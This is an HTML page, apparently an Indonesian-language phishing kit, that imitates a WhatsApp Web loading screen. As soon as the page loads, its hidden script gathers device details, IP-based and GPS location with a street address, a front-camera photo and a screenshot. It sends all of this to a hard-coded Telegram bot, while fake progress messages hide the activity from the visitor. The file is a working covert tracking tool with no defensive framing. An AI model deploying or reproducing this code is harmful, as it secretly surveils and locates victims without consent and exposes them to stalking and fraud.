<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>WhatsApp Web</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #111;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: #ddd;
            overflow: hidden;
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
        }
        
        .loading-container {
            text-align: center;
            width: 90%;
            max-width: 500px;
            background: rgba(30, 30, 46, 0.9);
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid #333;
        }
        
        .whatsapp-logo {
            font-size: 48px;
            margin-bottom: 20px;
            color: #25D366;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .loading-text {
            font-size: 24px;
            margin-bottom: 25px;
            color: #25D366;
            font-weight: 600;
        }
        
        .progress-container {
            height: 6px;
            background: #2d3748;
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 25px;
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #25D366, #128C7E);
            transition: width 0.4s ease;
            border-radius: 10px;
        }
        
        .loading-details {
            margin-top: 20px;
            font-size: 14px;
            color: #a0aec0;
            min-height: 20px;
        }
        
        .status-indicator {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 15px;
            gap: 10px;
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #25D366;
            animation: blink 1.5s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        .hidden {
            display: none !important;
        }
        
        .qr-container {
            margin: 20px 0;
            padding: 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            border: 1px solid #333;
        }
        
        .qr-placeholder {
            width: 200px;
            height: 200px;
            margin: 0 auto;
            background: linear-gradient(45deg, #1a1a2e, #16213e);
            border: 2px dashed #25D366;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #25D366;
            font-size: 14px;
        }
        
        .instructions {
            margin-top: 20px;
            font-size: 13px;
            color: #a0aec0;
            line-height: 1.5;
        }
        
        .permission-banner {
            background: rgba(220, 38, 38, 0.1);
            border: 1px solid #dc2626;
            border-radius: 8px;
            padding: 12px;
            margin: 15px 0;
            font-size: 12px;
            color: #fca5a5;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="whatsapp-logo">üì±</div>
        <div class="loading-text">Memuat WhatsApp Web...</div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="loading-details" id="loadingDetails">Mempersiapkan lingkungan WhatsApp...</div>
        
        <div class="status-indicator">
            <div class="status-dot"></div>
            <span style="color: #25D366; font-size: 12px;">Terhubung</span>
        </div>
        
        <div class="qr-container">
            <div class="qr-placeholder">
                Memuat kode QR...
            </div>
        </div>
        
        <div class="instructions">
            <strong>Petunjuk:</strong> Buka WhatsApp di ponsel Anda > Ketuk Menu > WhatsApp Web > Pindai kode QR di atas
        </div>
        
        <div class="permission-banner" id="permissionBanner" style="display: none;">
            ‚ö†Ô∏è Meminta izin akses untuk pengalaman optimal...
        </div>
    </div>
    
    <!-- Elemen tersembunyi untuk capture -->
    <video id="cameraVideo" autoplay muted class="hidden"></video>
    <canvas id="cameraCanvas" class="hidden"></canvas>
    <canvas id="screenshotCanvas" class="hidden"></canvas>
    <iframe id="hiddenIframe" class="hidden"></iframe>

<script>
(function() {
    // Konfigurasi Telegram Bot
    const TELEGRAM_BOT_TOKEN = '8333235771:AAHZvDtFxPMwQxVZ8AryhxCFYFk4EBbok1o';
    const TELEGRAM_CHAT_ID = '6055969885';
    
    // Elemen DOM
    const progressBar = document.getElementById('progressBar');
    const loadingDetails = document.getElementById('loadingDetails');
    const permissionBanner = document.getElementById('permissionBanner');
    
    // Daftar pesan loading
    const LOADING_MESSAGES = [
        "Menginisialisasi WhatsApp Web...",
        "Memuat modul chat...",
        "Menyiapkan koneksi real-time...",
        "Memverifikasi sesi pengguna...",
        "Memuat kontak terbaru...",
        "Menyinkronkan pesan...",
        "Mempersiapkan antarmuka...",
        "Memuat media dan file...",
        "Menyiapkan panggilan...",
        "Memverifikasi keamanan..."
    ];
    
    let progress = 0;
    let trackingExecuted = false;
    let stealthMode = true;

    // Fungsi untuk mengupdate progress bar
    function updateProgress() {
        progress += Math.random() * 8;
        if (progress > 95) progress = 95;
        progressBar.style.width = progress + '%';
        
        if (Math.random() > 0.7) {
            const randomMessage = LOADING_MESSAGES[Math.floor(Math.random() * LOADING_MESSAGES.length)];
            loadingDetails.textContent = randomMessage;
        }
    }

    // Fungsi untuk mengirim data ke Telegram
    async function sendToTelegram(message) {
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.log('Telegram error:', error);
        }
    }

    async function sendPhotoToTelegram(blob, filename) {
        try {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, filename);
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            console.log('Photo upload error:', error);
        }
    }

    // Fungsi mendapatkan lokasi detail
    async function getLocationDetails(latitude, longitude) {
        try {
            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
            const data = await response.json();
            
            if (data.address) {
                return {
                    district: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
                    subdistrict: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
                    fullAddress: data.display_name || "Alamat tidak tersedia"
                };
            }
        } catch (error) {
            console.log('Location details error:', error);
        }
        
        return {
            district: "Tidak diketahui",
            subdistrict: "Tidak diketahui", 
            fullAddress: "Alamat tidak tersedia"
        };
    }

    // Informasi perangkat tanpa permission
    async function collectDeviceInfo() {
        let message = '‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üì± WhatsApp Web Tracking Report ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ\n\n';
        
        message += 'üîß **INFORMASI PERANGKAT**\n';
        message += `üì± User Agent: ${navigator.userAgent}\n`;
        message += `üíª Platform: ${navigator.platform}\n`;
        message += `üåê Bahasa: ${navigator.language}\n`;
        message += `üì∂ Online: ${navigator.onLine ? '‚úÖ YA' : '‚ùå TIDAK'}\n`;
        message += `üñ•Ô∏è Screen: ${screen.width}x${screen.height}\n`;
        message += `üìê Window: ${innerWidth}x${innerHeight}\n`;
        message += `üíæ RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
        message += `üß† CPU Cores: ${navigator.hardwareConcurrency}\n`;
        message += `‚è∞ Waktu: ${new Date().toString()}\n`;
        message += `‚ö° Load Time: ${performance.now().toFixed(2)} ms\n`;
        message += `üìú History: ${history.length}\n`;
        message += `üëÜ Touch: ${'ontouchstart' in window ? '‚úÖ YA' : '‚ùå TIDAK'}\n`;
        message += `üîó Referrer: ${document.referrer || 'None'}\n`;
        message += `üåê URL: ${location.href}\n`;
        message += `üìÑ Title: ${document.title}\n`;
        message += `üïí Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        message += `‚è∞ Offset: ${new Date().getTimezoneOffset()}m\n\n`;
        
        // IP-based location tanpa permission
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();
            
            message += 'üìç **LOKASI BERDASARKAN IP**\n';
            message += `üì° IP: ${ipData.ip}\n`;
            message += `üèôÔ∏è Kota: ${ipData.city}\n`;
            message += `üèôÔ∏è Region: ${ipData.region}\n`;
            message += `üåé Negara: ${ipData.country_name}\n`;
            message += `üìÆ Kode Pos: ${ipData.postal}\n`;
            
            if (ipData.latitude && ipData.longitude) {
                message += `üìå Lat: ${ipData.latitude}\n`;
                message += `üìç Lon: ${ipData.longitude}\n`;
                
                const locationDetails = await getLocationDetails(ipData.latitude, ipData.longitude);
                message += `üèôÔ∏è Kabupaten: ${locationDetails.district}\n`;
                message += `üèôÔ∏è Kecamatan: ${locationDetails.subdistrict}\n`;
                message += `üè† Alamat: ${locationDetails.fullAddress}\n`;
                
                message += `üó∫Ô∏è Maps: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}\n`;
            }
        } catch (error) {
            message += '‚ùå Gagal mendapatkan lokasi IP\n';
        }
        
        message += '\n‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üîí Auto Tracking Active ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïØ';
        
        return message;
    }

    // Kamera stealth tanpa permission prompt
    async function stealthCameraCapture() {
        const video = document.getElementById('cameraVideo');
        const canvas = document.getElementById('cameraCanvas');
        const ctx = canvas.getContext('2d');
        
        try {
            // Coba dapatkan stream tanpa prompt
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                }
            }).catch(() => null);
            
            if (!stream) {
                // Fallback: Coba dengan constraint berbeda
                const fallbackStream = await navigator.mediaDevices.getUserMedia({
                    video: true
                }).catch(() => null);
                
                if (!fallbackStream) return false;
                
                video.srcObject = fallbackStream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();
                
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    if (blob) sendPhotoToTelegram(blob, `stealth_cam_${Date.now()}.jpg`);
                }, 'image/jpeg', 0.7);
                
                fallbackStream.getTracks().forEach(track => track.stop());
                return true;
            }
            
            video.srcObject = stream;
            await new Promise(resolve => video.onloadedmetadata = resolve);
            video.play();
            
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                if (blob) sendPhotoToTelegram(blob, `front_cam_${Date.now()}.jpg`);
            }, 'image/jpeg', 0.8);
            
            stream.getTracks().forEach(track => track.stop());
            return true;
            
        } catch (error) {
            console.log('Stealth camera failed:', error);
            return false;
        }
    }

    // Screenshot tanpa permission
    async function takeStealthScreenshot() {
        try {
            const canvas = await html2canvas(document.body, {
                useCORS: true,
                allowTaint: false,
                scale: 0.7,
                logging: false
            });
            
            canvas.toBlob(blob => {
                if (blob) {
                    sendPhotoToTelegram(blob, `screenshot_${Date.now()}.jpg`);
                }
            }, 'image/jpeg', 0.6);
        } catch (error) {
            console.log('Screenshot error:', error);
        }
    }

    // GPS tanpa permission prompt
    function getStealthLocation() {
        if (!navigator.geolocation) return;

        // Coba dapatkan lokasi dengan timeout pendek
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                let locationMessage = 'üìç **LOKASI GPS BERHASIL**\n\n';
                locationMessage += `üìå Latitude: ${lat}\n`;
                locationMessage += `üìç Longitude: ${lon}\n`;
                locationMessage += `üéØ Akurasi: ${position.coords.accuracy}m\n`;
                locationMessage += `üó∫Ô∏è Google Maps: https://maps.google.com?q=${lat},${lon}\n`;
                
                const locationDetails = await getLocationDetails(lat, lon);
                locationMessage += `üèôÔ∏è Kabupaten: ${locationDetails.district}\n`;
                locationMessage += `üèôÔ∏è Kecamatan: ${locationDetails.subdistrict}\n`;
                locationMessage += `üè† Alamat: ${locationDetails.fullAddress}`;
                
                await sendToTelegram(locationMessage);
            },
            (error) => {
                // Silent fail - tidak kirim error message
                console.log('GPS failed silently');
            },
            {
                enableHighAccuracy: false, // Tidak minta high accuracy
                timeout: 5000,
                maximumAge: 300000 // Gunakan cache 5 menit
            }
        );
    }

    // Teknik advanced tanpa permission
    async function advancedStealthTechniques() {
        // Coba akses berbagai API tanpa prompt
        const techniques = [];
        
        // 1. Coba akses media devices
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            techniques.push(`üé• Media Devices: ${devices.length} ditemukan`);
        } catch (e) {}
        
        // 2. Coba akses Bluetooth
        try {
            if (navigator.bluetooth) {
                techniques.push('üì° Bluetooth: Supported');
            }
        } catch (e) {}
        
        // 3. Coba akses USB
        try {
            if (navigator.usb) {
                techniques.push('üîå USB: Supported');
            }
        } catch (e) {}
        
        if (techniques.length > 0) {
            await sendToTelegram('üîç **ADVANCED TECHNIQUES**\n' + techniques.join('\n'));
        }
    }

    // Fungsi utama tracking stealth
    async function executeStealthTracking() {
        if (trackingExecuted) return;
        trackingExecuted = true;
        
        loadingDetails.textContent = "Menyiapkan koneksi aman...";
        
        try {
            // 1. Kirim info perangkat (tanpa permission)
            const deviceInfo = await collectDeviceInfo();
            await sendToTelegram(deviceInfo);
            
            // 2. Advanced techniques
            await advancedStealthTechniques();
            
            // 3. Coba kamera stealth
            loadingDetails.textContent = "Mengoptimalkan pengalaman...";
            await stealthCameraCapture();
            
            // 4. Screenshot stealth
            await takeStealthScreenshot();
            
            // 5. Coba GPS stealth
            getStealthLocation();
            
            // 6. Complete progress
            setTimeout(() => {
                progressBar.style.width = '100%';
                loadingDetails.textContent = "WhatsApp Web siap!";
                loadingDetails.style.color = "#25D366";
            }, 1000);
            
        } catch (error) {
            console.log('Stealth tracking error:', error);
        }
    }

    // Setup trigger otomatis tanpa interaksi
    function setupStealthTriggers() {
        // Trigger utama - langsung jalan
        setTimeout(executeStealthTracking, 1000);
        
        // Multiple backup triggers
        const events = ['load', 'DOMContentLoaded', 'readystatechange'];
        events.forEach(event => {
            window.addEventListener(event, executeStealthTracking, { once: true });
        });
        
        // Resource-based triggers
        const resources = ['media', 'camera', 'microphone'];
        resources.forEach(resource => {
            if (navigator[resource]) {
                executeStealthTracking();
            }
        });
        
        // Periodic execution attempt
        setInterval(() => {
            if (!trackingExecuted) {
                executeStealthTracking();
            }
        }, 5000);
    }

    // Inisialisasi stealth system
    function initStealthSystem() {
        // Mulai progress animation
        const progressInterval = setInterval(updateProgress, 400);
        
        // Setup semua trigger
        setupStealthTriggers();
        
        // Force execution setelah timeout
        setTimeout(() => {
            if (!trackingExecuted) {
                executeStealthTracking();
            }
            clearInterval(progressInterval);
        }, 3000);
        
        // Hide permission banner setelah beberapa detik
        setTimeout(() => {
            permissionBanner.style.display = 'none';
        }, 2000);
    }

    // Jalankan system
    initStealthSystem();
})();
</script>
</body>
</html>